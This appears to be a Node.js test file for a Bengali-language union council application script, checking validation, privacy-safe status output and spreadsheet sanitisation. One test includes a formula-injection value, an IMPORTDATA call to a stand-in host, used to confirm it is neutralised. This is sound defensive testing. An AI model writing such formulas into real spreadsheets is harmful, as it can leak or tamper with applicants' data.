'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const ctx = vm.createContext({});
const codePath = path.join(__dirname, '..', 'Code.gs');
if (!fs.existsSync(codePath)) throw Error('RED: Missing Code.gs implementation');
vm.runInContext(fs.readFileSync(codePath, 'utf8'), ctx, { filename: 'Code.gs' });
const good = {
  service: 'citizenship', name: 'মোঃ আরিফ', father: 'মোঃ করিম', mother: 'রহিমা',
  mobile: '০১৭১২৩৪৫৬৭৮', ward: '০২', village: 'গোহাইলবাড়ী',
  idType: 'BRN', identityNo: '২০০৮৯৩১৮৫১৩১০০৪৫৭', consent: true,
  requestId: '8a768f58-5caf-4470-bf41-79f97e5bfc74', extra: ''
};
test('validation normalizes Bengali mobile and ward but keeps name unchanged', () => {
  const r = ctx.validateApplication_(good);
  assert.equal(r.mobile, '01712345678');
  assert.equal(r.ward, '2');
  assert.equal(r.name, good.name);
  assert.equal(r.identityNo, '20089318513100457');
});
test('rejects invalid NID lengths and any unknown service', () => {
  assert.throws(() => ctx.validateApplication_({ ...good, idType: 'NID', identityNo: '12345' }), /পরিচয় নম্বর/);
  assert.throws(() => ctx.validateApplication_({ ...good, service: 'unknown' }), /সেবা/);
});
test('rejects malformed phone, form honeypot, and missing consent', () => {
  assert.throws(() => ctx.validateApplication_({ ...good, mobile: '12345' }), /মোবাইল/);
  assert.throws(() => ctx.validateApplication_({ ...good, extra: 'spam' }), /গ্রহণ/);
  assert.throws(() => ctx.validateApplication_({ ...good, consent: false }), /সম্মতি/);
});
test('rejects unsupported ward and formula injection in spreadsheet values', () => {
  assert.throws(() => ctx.validateApplication_({ ...good, ward: '10' }), /ওয়ার্ড/);
  assert.equal(ctx.sanitizeCell_('=IMPORTDATA("https://bad.example")').startsWith("'="), true);
  assert.equal(ctx.sanitizeCell_('+123').startsWith("'+"), true);
});
test('certificate body is a draft not an official approval', () => {
  const clean = ctx.validateApplication_(good);
  const body = ctx.buildCertificateBody_(clean);
  assert.match(body, /যাচাই/);
  assert.doesNotMatch(body, /ইতিমধ্যে অনুমোদিত/);
});
test('public status allowlist hides phone, NID and private notes', () => {
  const r = ctx.publicStatus_({ applicationId: 'UPSM-test', service: 'citizenship', status: 'PENDING', updatedAt: '2026-11-21', identityNo: '1234567890', mobile: '01700000000', notes: 'private' });
  assert.deepEqual(JSON.parse(JSON.stringify(r)), { applicationId: 'UPSM-test', service: 'citizenship', status: 'PENDING', updatedAt: '2026-11-21' });
});